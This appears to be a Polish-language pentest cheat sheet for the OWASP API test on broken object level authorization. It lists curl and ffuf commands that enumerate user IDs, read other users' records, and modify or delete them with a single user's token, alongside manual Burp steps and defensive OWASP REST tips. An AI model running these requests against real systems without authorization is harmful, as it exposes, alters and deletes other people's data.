# WSTG-APIT-02 — API Broken Object Level Authorization (BOLA)

## Cele

- Identify whether the API enforces proper object-level authorization checks

## KOMENDY

### IDOR na API

```bash
curl -s "https://TARGET/api/users/1" -H "Authorization: Bearer USER_TOKEN"
curl -s "https://TARGET/api/users/2" -H "Authorization: Bearer USER_TOKEN"
curl -s "https://TARGET/api/orders/1" -H "Authorization: Bearer USER_TOKEN"

```

### Brute force IDs

```bash
for i in $(seq 1 50); do echo "$i: $(curl -s -o /dev/null -w '%{http_code}' 'https://TARGET/api/users/'$i -H 'Authorization: Bearer USER_TOKEN')"; done

```

### Rozne operacje CRUD

```bash
curl -X GET "https://TARGET/api/users/OTHER_ID" -H "Authorization: Bearer USER_TOKEN"
curl -X PUT "https://TARGET/api/users/OTHER_ID" -H "Authorization: Bearer USER_TOKEN" -H "Content-Type: application/json" -d '{"name":"hacked"}'
curl -X DELETE "https://TARGET/api/users/OTHER_ID" -H "Authorization: Bearer USER_TOKEN"

```

### Test z roznym formatem ID

```bash
# Numeryczny: /api/users/123
# UUID: /api/users/550e8400-e29b-41d4-a716-446655440000
# Slug: /api/users/john-doe

```

## KOMENDY Z WORDLISTAMI

### SecLists numeric IDs

```bash
ffuf -u "https://TARGET/api/users/FUZZ" -w Desktop/WSTG/SecLists-master/Fuzzing/4-digits-0000-9999.txt -H "Authorization: Bearer USER_TOKEN" -mc 200 -o output_ffuf_bola.json

```

### PayloadsAllTheThings IDOR

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Insecure Direct Object References/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj endpointy z ID obiektow
2. Zaloguj sie jako user A, sprobuj CRUD na obiektach user B
3. Uzyj Burp Autorize extension
4. Testuj rozne formaty ID
5. Sprawdz nested resources: /api/users/1/orders/1


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — REST_Security_Cheat_Sheet.md, REST_Assessment_Cheat_Sheet.md

- Waliduj Content-Type requestu — odrzucaj nieoczekiwane typy
- Uzywaj API keys + OAuth 2.0 do uwierzytelnienia — nie sesji cookie
- Rate limituj wszystkie endpointy — szczegolnie auth i wyszukiwanie
- Waliduj wszystkie input parametry — typy, zakresy, dlugosci
- Zwracaj prawidlowe kody HTTP (401 vs 403 vs 404) — ale nie ujawniaj zbyt wiele
- Wymuszaj HTTPS — nie akceptuj HTTP requestow do API
- Implementuj CORS prawidlowo — nie uzywaj wildcard Origin

## ROZSZERZENIA BURP SUITE

| Rozszerzenie | Opis | Link |
|---|---|---|
| Swurg | Parsowanie i testowanie API na podstawie Swagger/OpenAPI | [GitHub](https://github.com/AresS31/swurg) |
| SwaggerParser | Import definicji Swagger do Burp | [GitHub](https://github.com/AresS31/SwaggerParser-BurpExtension) |
